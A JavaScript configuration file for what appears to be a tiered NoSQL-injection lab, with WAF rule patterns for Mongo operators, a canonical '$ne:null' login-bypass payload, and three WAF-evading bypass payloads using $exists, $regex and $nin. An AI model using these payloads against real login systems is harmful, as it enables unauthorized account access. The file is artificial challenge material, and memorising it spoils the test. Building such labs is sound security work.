// NoSQL (Mongo operator) injection — tiered.
// T0: no WAF; canonical `{"$ne":null}` operator object matches any password.
// T1: WAF blocks `$ne` / `$gt` operator literals. Bypasses use alt
//     operators ($regex with permissive pattern, $exists:true, $nin
//     with [null]).

export const RULE_POOL = [
  { name: 'nosql-op-ne',     pattern: '"\\$ne"',      flags: 'i' },
  { name: 'nosql-op-gt',     pattern: '"\\$gt"',      flags: 'i' },
  { name: 'nosql-op-where',  pattern: '"\\$where"',   flags: 'i' },
  { name: 'nosql-op-regex',  pattern: '"\\$regex"',   flags: 'i' },
  { name: 'nosql-op-exists', pattern: '"\\$exists"',  flags: 'i' },
  { name: 'nosql-op-in',     pattern: '"\\$in"',      flags: 'i' },
]

export const BYPASS_TEMPLATES = [
  // $exists:true matches any record with the field set
  () => '{"username":{"$exists":true},"password":{"$exists":true}}',
  // $regex with permissive pattern matches all
  () => '{"username":{"$regex":".*"},"password":{"$regex":".*"}}',
  // $nin with [null] — matches anything that isn't null
  () => '{"username":{"$nin":[null]},"password":{"$nin":[null]}}',
]

export const defences = {
  0: {
    canonicalPayload: () => '{"username":{"$ne":null},"password":{"$ne":null}}',
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => '{"username":{"$ne":null},"password":{"$ne":null}}',
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

export function generateT1Config(rng = Math.random) {
  // Block $ne and $gt. Bypasses use $exists / $regex / $nin which we
  // deliberately keep out of the required set.
  const required = ['nosql-op-ne', 'nosql-op-gt']
  const optional = RULE_POOL.filter(r => !required.includes(r.name) && !['nosql-op-regex', 'nosql-op-exists'].includes(r.name))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, 2),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
